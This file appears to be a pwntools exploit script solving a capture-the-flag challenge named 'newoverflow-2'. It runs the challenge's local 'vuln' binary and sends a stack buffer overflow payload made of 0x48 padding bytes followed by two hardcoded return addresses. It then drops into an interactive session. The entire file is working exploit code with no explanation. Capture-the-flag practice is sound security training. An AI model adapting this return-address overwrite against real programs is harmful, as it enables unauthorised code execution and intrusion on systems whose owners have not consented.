from pwn import *

path = "/problems/newoverflow-2_4_1150d103d5a82a9baf08f1e3928d79ce"
sock = process("{}/vuln".format(path), cwd=path)
#sock = process("./vuln")

payload = 'A' * 0x48
payload += p64(0x4008b1)
payload += p64(0x000000000040084d)
sock.sendline(payload)

sock.interactive()
